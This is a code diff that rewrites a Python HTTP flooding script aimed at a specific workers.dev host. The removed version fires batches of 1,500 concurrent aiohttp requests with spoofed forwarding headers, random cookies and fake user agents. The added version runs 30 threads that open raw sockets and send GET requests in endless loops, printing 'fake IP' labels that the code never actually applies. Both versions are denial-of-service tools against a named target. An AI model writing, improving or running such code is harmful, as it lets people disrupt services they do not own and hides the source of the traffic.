@@ -1,59 +1,72 @@
-import aiohttp
-import asyncio
-import secrets  # Import modul secrets untuk nilai acak
-import faker  # Import modul faker untuk membuat data palsu
+import socket
+import random
+import threading
 
-fake = faker.Faker()
+# Define the target server and port
+target = "sxtcp.tg-index.workers.dev"
+port = 80
 
-# Konfigurasi IP palsu
-fake_ip_range = '101.78.64.0/18'
-fake_ip_filter = ['*.lan', '*.local']
-nameserver = ['8.8.8.8']
+# Define the first fake IP address
+fake_ip1 = "20.205.61.143"
 
-# Buat nilai acak untuk header Set-Cookie
-random_cookie_value = secrets.token_hex(20)  # Ubah panjang sesuai kebutuhan
-
-# Buat kustom header dengan alamat IP palsu, cookie palsu, dan User-Agent palsu
-custom_headers = {
-    'X-Forwarded-For': fake_ip_range,
-    'X-Client-IP': fake_ip_range,
-    'Cookie': f'_sessions={random_cookie_value}; path=/; HttpOnly',  # Set-Cookie header dengan nilai acak
-    'User-Agent': fake.user_agent(),  # User-Agent header
-}
-
-async def send_request(url):
-    try:
-        async with aiohttp.ClientSession(headers=custom_headers) as session:
-            async with session.get(url) as response:
-                response_text = await response.text()
-                return response_text
-    except Exception as e:
-        return None
-
-async def main():
-    default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
-    num_requests = 1000  # Jumlah permintaan yang ingin Anda kirim
-
+# Function to send HTTP GET requests with the first fake IP
+def send_request_with_fake_ip1():
     while True:
-        # Inisialisasi list untuk menyimpan hasil respons
-        responses = []
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+            print(f"Sent request with fake IP: {fake_ip1}")
+        except Exception as e:
+            print("An error occurred:", str(e))
 
-        # Buat daftar 10 tugas tambahan untuk mengirim permintaan
-        additional_tasks = [send_request(default_url) for _ in range(500)]
+# Define the second fake IP address
+fake_ip2 = "103.84.206.169"
 
-        # Gabungkan tugas-tugas tambahan dengan tugas sebelumnya
-        tasks = [send_request(default_url) for _ in range(num_requests)]
-        tasks += additional_tasks
+# Function to send HTTP GET requests with the second fake IP
+def send_request_with_fake_ip2():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+            print(f"Sent request with fake IP: {fake_ip2}")
+        except Exception as e:
+            print("An error occurred:", str(e))
 
-        # Jalankan tugas-tugas secara bersamaan
-        responses = await asyncio.gather(*tasks)
+# Define the third fake IP address
+fake_ip3 = "101.37.18.10"
 
-        # Handle hasil respons di sini
-        for response in responses:
-            if response is not None:
-                print('Success')
-            else:
-                print('Failed')
+# Function to send HTTP GET requests with the third fake IP
+def send_request_with_fake_ip3():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+            print(f"Sent request with fake IP: {fake_ip3}")
+        except Exception as e:
+            print("An error occurred:", str(e))
 
-if __name__ == "__main__":
-    asyncio.run(main())
+# Create and start 10 threads for each function
+threads = []
+for _ in range(10):
+    thread1 = threading.Thread(target=send_request_with_fake_ip1)
+    thread2 = threading.Thread(target=send_request_with_fake_ip2)
+    thread3 = threading.Thread(target=send_request_with_fake_ip3)
+    thread1.start()
+    thread2.start()
+    thread3.start()
+    threads.append(thread1)
+    threads.append(thread2)
+    threads.append(thread3)
+
+# Wait for all threads to finish (you can modify this logic as needed)
+for thread in threads:
+    thread.join()
